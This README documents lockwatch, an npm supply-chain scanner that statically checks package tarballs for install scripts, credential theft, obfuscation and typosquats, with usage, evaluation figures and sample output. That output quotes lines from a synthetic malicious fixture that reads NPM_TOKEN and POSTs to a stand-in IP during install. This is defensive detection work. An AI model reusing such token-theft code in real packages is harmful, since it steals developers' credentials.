# lockwatch

**npm supply-chain risk scanner.** lockwatch reads a `package-lock.json`,
downloads every package it resolves to, checks each tarball against the
lockfile's integrity hash, unpacks it safely and statically analyses it,
before anything is installed. It reports risky behaviour with evidence:
install scripts that download and run code, install-time `child_process` and
network use, credential theft, dynamic code, obfuscation, typosquats, very
new versions, maintainer changes, unexpected binaries and integrity
mismatches.

It never runs package code: no `npm install`, no `node`, no lifecycle
scripts. A test checks that a scan of the malicious fixtures performs exactly
one `execve` (lockwatch itself).

- `lockwatch` (Rust): the scanner, usable on its own.
- `api/` (Node.js + TypeScript, Fastify): a thin HTTP service around it.

## Architecture

```
            +-------------------------+
 lockfile   |  Node API (Fastify, TS) |  spawn (no shell), timeout, size limits
 --POST-->  |  /scan  /scan/:id       | ---------------------------+
            |  SQLite job + result store                           |
            +-------------------------+                            v
                                                     +---------------------------+
                                                     |  Rust CLI: lockwatch       |
                                                     |  1 parse lockfile          |
                                                     |  2 fetch tarballs (async)  |
                                                     |    verify SRI integrity    |
                                                     |    disk cache by integrity |
                                                     |  3 safe extract (limits)   |
                                                     |  4 run rules (parallel)    |
                                                     |  5 score + JSON report     |
                                                     +---------------------------+
```

Inside the scanner, each JavaScript file is parsed once with
[oxc](https://oxc.rs) into plain "facts" (child_process calls, network
modules, secret reads, `eval`, long strings...), and the twelve rules filter
those facts. Downloads run concurrently on tokio; unpacking and analysis run
on all cores with rayon. Details: [docs/RULES.md](docs/RULES.md) and
[docs/DECISIONS.md](docs/DECISIONS.md).

## Quick start

### CLI

Requires Rust 1.97 or later.

```sh
cargo build --release
./target/release/lockwatch scan path/to/package-lock.json
./target/release/lockwatch scan package-lock.json --format json --out report.json
./target/release/lockwatch scan-package left-pad@1.3.0
./target/release/lockwatch scan-tarball some-package-1.0.0.tgz   # local file, or - for stdin
./target/release/lockwatch rules
```

Try it without the network on the committed fixtures:

```sh
./target/release/lockwatch scan fixtures/lockfiles/mixed.json \
  --offline --cache-dir fixtures/cache --now 2026-10-20T00:00:00Z
```

Options for `scan` and `scan-package`:

| Option | Default | Meaning |
|---|---|---|
| `--format json\|table` | `table` | Output format |
| `--out FILE` | stdout | Write the report to a file |
| `--concurrency N` | `16` | Parallel downloads |
| `--cache-dir DIR` | `$LOCKWATCH_CACHE_DIR`, else `~/.cache/lockwatch` | Tarball and metadata cache |
| `--fail-on high\|medium\|low\|critical\|none` | `high` | Severity that makes the exit code 1 |
| `--offline` | off | Cache only, no network |
| `--registry URL` | `https://registry.npmjs.org` | Registry for metadata and tarballs |
| `--timeout SECS` | `60` | Per-request timeout |
| `--now RFC3339` | current time | Evaluate time-based rules as of this time |

`scan-tarball` scans a package tarball you already have (or one piped in on
stdin). It reads the name and version from its `package.json` unless
`--name`/`--package-version` are given, checks `--integrity` if given (LW012),
and only contacts the registry with `--metadata` (for LW009/LW010).

Exit codes: `0` nothing at or above `--fail-on`; `1` findings at or above it;
`2` tool error, or some packages could not be scanned (listed under
`skipped` with `"error": true`).

Only `https` tarball URLs on `registry.npmjs.org`, `registry.yarnpkg.com` or
the `--registry` origin are fetched; anything else is listed as skipped. This
keeps an uploaded lockfile from making the API request internal URLs.

### API with Docker

```sh
docker compose up --build        # http://localhost:8080
curl localhost:8080/health
curl -X POST -H 'content-type: application/json' \
  --data-binary @package-lock.json localhost:8080/scan
curl -F "lockfile=@package-lock.json" localhost:8080/scan    # multipart upload
```

| Endpoint | Description |
|---|---|
| `POST /scan` | JSON body or multipart file, max 5 MB. 200 packages or fewer: scanned synchronously, `200` with the report (and an `x-scan-id` header). More: `202 {"id", "status": "queued"}`. Malformed input: `400 {"error": "..."}`; oversize: `413`; timeout: `504`; scanner failure: `502`. |
| `GET /scan/:id` | `{id, status: queued\|running\|done\|failed, created_at, updated_at, package_count, report?, error?}`; `404` for unknown or expired ids |
| `GET /rules` | Rule list (from `lockwatch rules --format json`) |
| `GET /health` | Liveness, whether the binary was found, its version, queue size |

The container runs as a non-root user with a read-only root filesystem and no
Linux capabilities. Behind a TLS-inspecting proxy, build with
`docker build --secret id=extra_ca,src=ca.pem .`.

### API configuration

| Variable | Default | Meaning |
|---|---|---|
| `PORT` | `8080` | HTTP port |
| `HOST` | `0.0.0.0` | Listen address |
| `LOCKWATCH_BIN` | `lockwatch` (on `PATH`) | Path of the Rust binary |
| `SCAN_TIMEOUT_MS` | `120000` | A scan is killed (SIGKILL) after this |
| `MAX_CONCURRENT_SCANS` | `2` | In-process queue limit |
| `DB_PATH` | `./lockwatch.db` | SQLite file for jobs and reports |
| `LOCKWATCH_CACHE_DIR` | (binary default) | Passed as `--cache-dir` |
| `LOCKWATCH_OFFLINE` | `false` | Pass `--offline` |
| `LOCKWATCH_REGISTRY` | (binary default) | Passed as `--registry` |
| `SYNC_MAX_PACKAGES` | `200` | Larger lockfiles become jobs |
| `MAX_UPLOAD_BYTES` | `5242880` | Upload limit |
| `RATE_LIMIT_MAX` / `RATE_LIMIT_WINDOW_MS` | `30` / `60000` | Requests per IP per window |
| `REPORT_TTL_DAYS` | `7` | Reports are deleted after this |
| `LOG_LEVEL` | `info` | pino log level (request bodies are never logged) |

Without Docker: `cd api && npm ci && npm run build && LOCKWATCH_BIN=../target/release/lockwatch npm start`
(Node 22 or later).

## Sample output

From `lockwatch scan fixtures/lockfiles/mixed.json --offline --cache-dir fixtures/cache --now 2026-10-20T00:00:00Z`
(abridged; the full output is the snapshot in
`crates/lockwatch-cli/tests/snapshots/fixtures__mixed_table.snap`):

```
PACKAGE                     LEVEL     SCORE  RULES
lwfx-steal-env-token@1.0.0  critical    100  LW001, LW004, LW005
lwfx-tampered@1.0.0         high         60  LW012
lwfx-cp-in-helper@1.0.0     medium       33  LW001, LW003
lwfx-curl-pipe-sh@1.0.0     medium       33  LW001, LW002
lwfx-obf-entropy@1.0.0      low          24  LW006, LW007
expresss@1.0.0              low          12  LW008
lwfx-new-maintainer@1.0.0   low          12  LW010
lwfx-fresh-release@1.0.0    none          3  LW009
lwfx-hidden-elf@1.0.0       none          3  LW011
lwfx-ok-node-gyp@1.0.0      none          0  LW001
(2 packages with no findings not shown)

Findings

  lwfx-steal-env-token@1.0.0 (critical, score 100)
    [high] LW004 i.js:6
        const req = https.request({ host: '203.0.113.22', port: 443, method: 'POST' });
        Install-time code makes a network request (https) and contains a hard-coded IP address (203.0.113.22).
    [critical] LW005 i.js:3
        npm: process.env.NPM_TOKEN,
        Reads the secret-looking environment variable NPM_TOKEN. The same install-time file uses the network, which is how stolen secrets are sent out.
  ...
```

The JSON report follows [docs/report.schema.json](docs/report.schema.json).

## Evaluation

All numbers below come from `eval/run_eval.sh`; the full output is
[eval/results/summary.md](eval/results/summary.md) (run started
2026-10-11T23:48:24Z), with CSVs next to it. "Flagged" means risk level
medium or above (score 30 or more).

### Synthetic fixtures (sanity check, not a benchmark)

43 malicious and 14 benign packages written for this repo
([fixtures/README.md](fixtures/README.md)).

- Malicious fixtures flagged: **26 of 43 (60.5%)**; with at least one
  finding: 43 of 43 (100.0%). The 17 not flagged only show signals that score
  below 30 by design (a typosquat name alone, `eval` alone, an unexplained
  binary alone...).
- Benign fixtures flagged: **2 of 14** (`lwfx-ok-esbuild-like`,
  `lwfx-ok-sdk-api-key`; both model known false-positive classes on purpose).

| Rule | TP | FN | FP (benign) |
|---|---:|---:|---:|
| LW001 | 25 | 0 | 0 |
| LW002 | 8 | 0 | 0 |
| LW003 | 8 | 0 | 1 |
| LW004 | 9 | 0 | 1 |
| LW005 | 5 | 0 | 1 |
| LW006 | 5 | 0 | 1 |
| LW007 | 4 | 0 | 1 |
| LW008 | 4 | 0 | 0 |
| LW009 | 1 | 0 | 0 |
| LW010 | 1 | 0 | 0 |
| LW011 | 3 | 0 | 0 |
| LW012 | 1 | 0 | 0 |

### Top 500 npm packages (false positives)

[eval/benign_top500.txt](eval/benign_top500.txt): the 500 most downloaded
packages (ranking from npm-high-impact 1.13.0, published 2026-06-08), each at
its latest version on 2026-10-11.

- Flagged: **2 of 500 (0.4%)**: `esbuild` (high: install script runs
  `execFileSync` and can download its binary with `https`) and `pnpm`
  (critical: install script spawns `node`, CLI reads `.npmrc`). Both really
  do these things; they are false positives in the sense that the packages
  are benign.
- With at least one finding of any severity: 163 of 500 (32.6%), mostly
  `low`/`medium` signals: install scripts (55), very new versions (49),
  dynamic code (31), obfuscation heuristics on bundled or generated files
  (31).
- The rules as specified flagged the same 2 packages; one change (LW010 and
  npm trusted publishing) reduced noise without changing that number. See
  "Tuning after the baseline evaluation" in [docs/DECISIONS.md](docs/DECISIONS.md)
  and [eval/results/baseline/](eval/results/baseline/).

### Performance

Per package (`lockwatch scan-package` as a separate process, wall clock,
including download, extraction and analysis), 500 packages:

| Cache | Median | p95 |
|---|---:|---:|
| cold | 117 ms | 476 ms |
| warm | 20 ms | 107 ms |

Whole lockfile ([eval/bench](eval/bench), 401 entries, 395 unique packages,
concurrency 16): **5949 ms** with a cold cache, **2583 ms** warm.

Machine: Intel Xeon @ 2.80 GHz, 4 logical CPUs, 15 GB RAM, Linux 6.18, rustc
1.97.0, in a cloud sandbox. Cold numbers depend heavily on the network.

### Real malicious samples

**Not evaluated.** The optional dataset of real malicious npm packages was
not used, so there is no real-world detection rate. The fixture numbers above
are not a substitute for one.

### Honesty notes

- The fixtures and the rules were written by the same people, so the
  fixture results show the rules do what they were written to do; they say
  little about unseen malware.
- Static analysis misses behaviour that only appears at runtime: code
  downloaded or decrypted while running, environment-dependent branches,
  anything built from data the scanner cannot evaluate.
- The obfuscation thresholds (entropy 5.0, 30% escapes, 5,000-character
  lines, `_0x` density) and the typosquat distances are heuristics, not
  tuned on a labelled dataset.
- The popular-package list is a snapshot (2026-10-11), and it lacks
  deprecated packages because of the data source; the top-500 ranking is from
  June 2026.
- The false-positive rate counts only packages reaching medium. A third of
  popular packages get at least one lower-severity finding.

## Development

```sh
cargo fmt --all -- --check && cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace                       # unit, snapshot, schema, no-exec tests
cargo run -p lockwatch-core --example build_fixtures   # rebuild fixtures/cache and lockfiles
cd api && npm ci && npm run lint && npm test # API tests (integration tests use ../target/*/lockwatch)
eval/run_eval.sh                             # full evaluation (network; about 2 to 3 minutes here)
node scripts/build_popular.ts                # refresh data/popular.txt
node scripts/build_top500.ts                 # refresh eval/benign_top500.txt
```

CI (`.github/workflows/ci.yml`) runs the Rust checks and tests (with strace
for the no-exec test), checks that the committed fixtures match their
sources, lints and tests the API, runs the API integration tests against the
release binary, and builds and smoke-tests the Docker image.

```
crates/lockwatch-core/   library: lockfile, registry + cache, extract, analysis, rules, score, report
crates/lockwatch-cli/    the lockwatch binary and its end-to-end tests
api/                     Fastify service (src/, test/)
fixtures/                synthetic packages, generated cache and lockfiles
eval/                    top-500 list, benchmark lockfile, run_eval.sh, results/
scripts/                 data generators (popular list, top 500)
docs/                    RULES.md, DECISIONS.md, LEARNING.md, report.schema.json
```

Learning notes for every Rust and Node concept used are in
[docs/LEARNING.md](docs/LEARNING.md).

## How this was built

The specification (goals, rules, report format, evaluation plan, acceptance
criteria) was written by Stephen Guzzarlapudi. The implementation, tests,
fixtures, evaluation scripts and documentation were written by Claude Code
(Anthropic's coding agent) working from that spec, recording its choices in
`docs/DECISIONS.md`. Review and testing by Stephen.

## License

MIT, see [LICENSE](LICENSE).
